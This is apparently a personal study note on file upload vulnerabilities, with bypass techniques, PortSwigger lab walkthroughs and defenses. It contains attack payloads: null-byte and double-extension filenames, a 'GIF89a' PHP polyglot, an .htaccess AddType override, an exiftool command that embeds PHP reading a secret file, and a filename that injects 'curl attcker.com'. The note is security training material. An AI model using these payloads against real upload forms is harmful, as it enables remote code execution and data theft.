![[file-upload-vulnerabilities.jpg]]
## The main headers are on the upload request:
- File Name
- File Type
- Magic Number (the code that identify the type of the file content)
- File Content
- File Size
# What is the impact of file upload vulnerabilities?
1. If the *filename* isn't validated properly, this could allow an attacker to overwrite critical files simply by uploading a file with the same name
2. Failing to make sure that the *size* of the file falls within expected thresholds could also enable a form of denial-of-service (DoS) attack, whereby the attacker fills the available disk space.
## How do web servers handle requests for static files?
The process for handling these static files is still largely the same. At some point, the server parses the path in the request to identify the file extension. It then uses this to determine the type of the file being requested, typically by comparing it to a list of preconfigured mappings between extensions and MIME types. What happens next depends on the file type and the server's configuration.
- If this file type is non-executable, such as an image or a static HTML page, the server may just send the file's contents to the client in an HTTP response.
- If the file type is executable, such as a PHP file, **and** the server is configured to execute files of this type, it will assign variables based on the headers and parameters in the HTTP request before running the script. The resulting output may then be sent to the client in an HTTP response.
- If the file type is executable, but the server **is not** configured to execute files of this type, it will generally respond with an error. However, in some cases, the contents of the file may still be served to the client as plain text. Such misconfigurations can occasionally be exploited to leak source code and other sensitive information. You can see an example of this in our information disclosure learning materials.

#### Bypassing Developers Validation
### 1. Blacklist
*How to bypass*
- change the case of the word `.PhP`
- `php5` , `shtml`
- use `.pht` as extension for (Apache-Linux)
- use `.asa` or `.cer` as extension for (IIS-Windows) (because it mapped to asp.dll and executed as ASP code)
- create file `.eml` (bug on internet explorer)
	![[Screenshot 2024-07-31 183153 1.png]]
---
### 2. Whitelist
*How to bypass*
* add the two extension for the file and the server will take last one
* add null terminator between the two extensions and the server will take first one 
	**example :** `shell.php%001.jpg` or `shell.php%00.jpg` 
- upload SVG image
	![[Screenshot 2024-07-31 183302.png]]
- Allow video upload
	![[Screenshot 2024-07-31 183307.png]]
* Directory Traversal
	change the file name to `../../../adel.png` to change the logo or to traverse
* try to know the processing software and exploit it
* in IIS version < 7 you can upload file with two extension and semicolon and the server will take the first
	**example :** `file.aspx;.jpg`
- if the site do not validate the file size report it as DDOS attack
- if the site do not validate the extension but validates the magic number you can upload the PHP code and write the magic number of PNG in the file
	**example :** `GIF89a;<?php phpinfo(); ?>`
- if you upload ZIP file some sites handles these files with command line so you can manipulate the file name to get RCE
	**example :** `adel.png; curl attcker.com;`
Out Of Bound SQL injection using file name by make the file name as SQL code to request my server 
- Cross domain object hijacking
	
	![[Screenshot 2024-07-31 183356.png]]
## Exploiting file upload vulnerabilities without remote code execution
#### Uploading malicious client-side scripts
Although you might not be able to execute scripts on the server, you may still be able to upload scripts for client-side attacks. For example, if you can upload HTML files or SVG images, you can potentially use `<script>` tags to create stored XSS payloads.
If the uploaded file then appears on a page that is visited by other users, their browser will execute the script when it tries to render the page. Note that due to same-origin policy restrictions, these kinds of attacks will only work if the uploaded file is served from the same origin to which you upload it.
#### Exploiting vulnerabilities in the parsing of uploaded files
If the uploaded file seems to be both stored and served securely, the last resort is to try exploiting vulnerabilities specific to the parsing or processing of different file formats. For example, you know that the server parses XML-based files, such as Microsoft Office `.doc` or `.xls` files, this may be a potential vector for XXE injection attacks.
#### Uploading files using PUT

## Labs
* #Portswigger
	1. **Remote code execution via web shell upload** #APPRENTICE 
		upload file without any restrictions
	2. **Web shell upload via Content-Type restriction bypass** #APPRENTICE 
		upload PHP file but change the content-type in the request to `image/png`
	3. **Web shell upload via path traversal** #PRACTITIONER 
		in this lab the the site do not make you execute your file in this directory so you will upload it in the previous directory `../adel.php` but the server do not allow back slashes so you will encode it  `..%2fadel.php` and request the file from the previous directory
	4. **Web shell upload via extension blacklist bypass** #PRACTITIONER 
		to solve this lab the site block you from uploading a PHP file but the server is Apache so you will manipulate the `.htaccess` file which the configuration file of the Apache by change the file name that we going to upload to `.htaccess` and add content to this file which is `AddType application/x-httpd-php .dula`   and the content type to `text/plain` and send the request now you change the configuration of the Apache to make it process any file with `.dula` extension as PHP file
	5. **Web shell upload via obfuscated file extension**  #PRACTITIONER 
		use null byte `adel.php%00.png`
	6. **Remote code execution via polyglot web shell upload** #PRACTITIONER 
		we will use `exiftool` to hide PHP code on the image and upload it as PHP file so it will be processed as PHP file and we will get the flag
		*command :*
		`exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`
	7. **Web shell upload via race condition** #EXPERT 
		to solve this lab you need to use race condition because the file has been uploaded temporary before its been validated we will exploit this condition and access the file at the same time we upload it 
# Common defenses against file upload vulnerabilities
- Check the file extension against a whitelist of permitted extensions
- Make sure the filename doesn't contain a traversal sequence (`../`).
- Rename uploaded files to avoid collisions that may cause existing files to be overwritten.
- Do not upload files to the server's permanent filesystem until they have been fully validated.
- As much as possible, use an established framework for pre-processing file uploads.
```chartsview
#-----------------#
#- chart type    -#
#-----------------#
type: Radar

#-----------------#
#- chart data    -#
#-----------------#
data:
  - item: "Back-End Code"
    user: "Effective against the attack"
    score: 90
  - item: "Browser"
    user: "Effective against the attack"
    score: 0
  - item: "Server"
    user: "Effective against the attack"
    score: 70
  - item: "Client-Side Code"
    user: "Effective against the attack"
    score: 0
  - item: "WAF"
    user: "Effective against the attack"
    score: 50

#-----------------#
#- chart options -#
#-----------------#
options:
  xField: "item"
  yField: "score"
  seriesField: "user"
  meta:
    score:
      alias: "Score"
      min: 0
      nice: true
  xAxis:
    line: null
    tickLine: null
  yAxis:
    label: false
    grid:
      alternateColor: "rgba(0, 0, 0, 0.1)"
  point: {}
  area: {}
```
# NOTES
- The `Content-Type` response header may provide clues as to what kind of file the server thinks it has served. If this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping.

# Techniques
#### 1. 


